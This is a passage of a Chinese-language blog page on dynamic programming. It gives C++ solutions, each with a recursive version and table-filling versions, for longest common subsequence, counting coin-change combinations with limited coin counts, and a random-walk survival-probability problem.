class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> max(p1, max(p2, p3));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-keyword">return</span> process1(str1, str2, str1.size() - <span class="hljs-number">1</span>, str2.size() - <span class="hljs-number">1</span>);<br>&#125;<br><br><br><br><br><span class="hljs-comment">//傻缓存</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str2, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-comment">// 如果已经计算过这个子问题，直接返回结果</span><br>    <span class="hljs-keyword">if</span> (dp[i][j] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][j];<br>    &#125;<br>    <span class="hljs-comment">// 计算最长公共子序列</span><br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : process1(str1, str2, i, j - <span class="hljs-number">1</span>, dp);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : process1(str1, str2, i - <span class="hljs-number">1</span>, j, dp);<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// i != 0 &amp;&amp; j != 0</span><br>        <span class="hljs-type">int</span> p1 = process1(str1, str2, i - <span class="hljs-number">1</span>, j, dp);<br>        <span class="hljs-type">int</span> p2 = process1(str1, str2, i, j - <span class="hljs-number">1</span>, dp);<br>        <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + process1(str1, str2, i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>, dp)) : <span class="hljs-number">0</span>;<br>        dp[i][j] = max(p1, max(p2, p3));<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[i][j];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-type">int</span> m = str1.size();<br>    <span class="hljs-type">int</span> n = str2.size();<br>    <span class="hljs-comment">// 创建一个 dp 数组，初始化为 -1，表示还没有计算过</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(m, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n, <span class="hljs-number">-1</span>));<br>    <span class="hljs-keyword">return</span> process1(str1, str2, m - <span class="hljs-number">1</span>, n - <span class="hljs-number">1</span>, dp);<br>&#125;<br><br><br><br><br><br><span class="hljs-comment">// 动态规划解法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-type">int</span> N = str1.size();<br>    <span class="hljs-type">int</span> M = str2.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(M, <span class="hljs-number">0</span>));<br><br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = (str1[<span class="hljs-number">0</span>] == str2[<span class="hljs-number">0</span>]) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; M; j++) &#123;<br>        dp[<span class="hljs-number">0</span>][j] = (str1[<span class="hljs-number">0</span>] == str2[j]) ? <span class="hljs-number">1</span> : dp[<span class="hljs-number">0</span>][j - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        dp[i][<span class="hljs-number">0</span>] = (str1[i] == str2[<span class="hljs-number">0</span>]) ? <span class="hljs-number">1</span> : dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; M; j++) &#123;<br>            <span class="hljs-type">int</span> p1 = dp[i - <span class="hljs-number">1</span>][j];<br>            <span class="hljs-type">int</span> p2 = dp[i][j - <span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) : <span class="hljs-number">0</span>;<br>            dp[i][j] = max(p1, max(p2, p3));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[N - <span class="hljs-number">1</span>][M - <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> s1 = <span class="hljs-string">&quot;abcde&quot;</span>;<br>    <span class="hljs-built_in">string</span> s2 = <span class="hljs-string">&quot;ace&quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Longest Common Subsequence (Recursive): &quot;</span> &lt;&lt; longestCommonSubsequence1(s1, s2) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Longest Common Subsequence (DP): &quot;</span> &lt;&lt; longestCommonSubsequence2(s1, s2) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="硬币找零问题"><a href="#硬币找零问题" class="headerlink" title="硬币找零问题"></a>硬币找零问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 统计硬币面值和张数,假设输入数组是：1, 2, 2, 3, 3, 3,遍历 arr 统计每个元素出现的次数，counts 会变成 &#123;1: 1, 2: 2, 3: 3&#125;。然后，代码遍历 counts 并将：1 加入 coins，1 加入 zhangs。2 加入 coins，2 加入 zhangs。3 加入 coins，3 加入 zhangs。最终，返回 pair：coins = &#123;1, 2, 3&#125;zhangs = &#123;1, 2, 3&#125;</span><br><span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; getInfo(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr) &#123;<br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; counts;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) counts[value]++;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; coins, zhangs;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : counts) &#123;<br>        coins.push_back(entry.first);<br>        zhangs.push_back(entry.second);<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;coins, zhangs&#125;;<br>&#125;<br><br><span class="hljs-comment">// 递归方法</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index == coins.size()) <span class="hljs-keyword">return</span> rest == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> ways = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> zhang = <span class="hljs-number">0</span>; zhang &lt;= zhangs[index] &amp;&amp; zhang * coins[index] &lt;= rest; zhang++) &#123;<br>        ways += process(coins, zhangs, index + <span class="hljs-number">1</span>, rest - zhang * coins[index]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">coinsWay</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-keyword">return</span> process(coins, zhangs, <span class="hljs-number">0</span>, aim);<br>&#125;<br><br><br><br><br><span class="hljs-comment">// 动态规划方法 1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-type">int</span> N = coins.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(aim + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[N][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= aim; rest++) &#123;<br>            <span class="hljs-type">int</span> ways = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> zhang = <span class="hljs-number">0</span>; zhang &lt;= zhangs[index] &amp;&amp; zhang * coins[index] &lt;= rest; zhang++) &#123;<br>                ways += dp[index + <span class="hljs-number">1</span>][rest - zhang * coins[index]];<br>            &#125;<br>            dp[index][rest] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][aim];<br>&#125;<br><br><br><br><br><span class="hljs-comment">// 动态规划方法 2（优化）</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-type">int</span> N = coins.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(aim + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[N][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= aim; rest++) &#123;<br>            dp[index][rest] = dp[index + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-keyword">if</span> (rest - coins[index] &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[index][rest] += dp[index][rest - coins[index]];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (rest - coins[index] * (zhangs[index] + <span class="hljs-number">1</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[index][rest] -= dp[index + <span class="hljs-number">1</span>][rest - coins[index] * (zhangs[index] + <span class="hljs-number">1</span>)];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][aim];<br>&#125;<br><br><span class="hljs-comment">// 随机生成测试数组</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> maxLen, <span class="hljs-type">int</span> maxValue)</span> &#123;<br>    <span class="hljs-type">int</span> N = rand() % maxLen;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(N)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) arr[i] = rand() % maxValue + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// 打印数组</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) <span class="hljs-built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">// 主函数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));<br>    <span class="hljs-type">int</span> maxLen = <span class="hljs-number">10</span>, maxValue = <span class="hljs-number">20</span>, testTime = <span class="hljs-number">1000000</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试开始&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(maxLen, maxValue);<br>        <span class="hljs-type">int</span> aim = rand() % maxValue;<br>        <span class="hljs-type">int</span> ans1 = coinsWay(arr, aim);<br>        <span class="hljs-type">int</span> ans2 = dp1(arr, aim);<br>        <span class="hljs-type">int</span> ans3 = dp2(arr, aim);<br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; aim &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans3 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;测试结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="醉汉bob"><a href="#醉汉bob" class="headerlink" title="醉汉bob"></a>醉汉bob</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//计算k步后不会出去的概率</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 递归解法：计算生存可能性</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">livePosibility1</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-keyword">return</span> static_cast&lt;<span class="hljs-type">double</span>&gt;(process(row, col, k, N, M)) / <span class="hljs-built_in">pow</span>(<span class="hljs-number">4</span>, k);<br>&#125;<br><span class="hljs-comment">// 递归处理函数，返回当前状态下的生存点数</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-keyword">if</span> (row &lt; <span class="hljs-number">0</span> || row &gt;= N || col &lt; <span class="hljs-number">0</span> || col &gt;= M) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果超出棋盘范围，返回0</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果走完所有步数且仍在棋盘中，返回1</span><br>    &#125;<br>    <span class="hljs-comment">// 继续递归，尝试四个方向</span><br>    <span class="hljs-type">long</span> up = process(row - <span class="hljs-number">1</span>, col, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> down = process(row + <span class="hljs-number">1</span>, col, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> left = process(row, col - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> right = process(row, col + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-keyword">return</span> up + down + left + right;<br>&#125;<br><br><br><br><span class="hljs-comment">// 动态规划解法：计算生存可能性</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">livePosibility2</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;(M, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(k + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)));<br>    <span class="hljs-comment">// 初始化 dp 数组，rest=0 的时候每个位置都算作生存点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; ++j) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 动态规划填表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">1</span>; rest &lt;= k; ++rest) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; N; ++r) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt; M; ++c) &#123;<br>                dp[r][c][rest] = pick(dp, N, M, r - <span class="hljs-number">1</span>, c, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r + <span class="hljs-number">1</span>, c, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r, c - <span 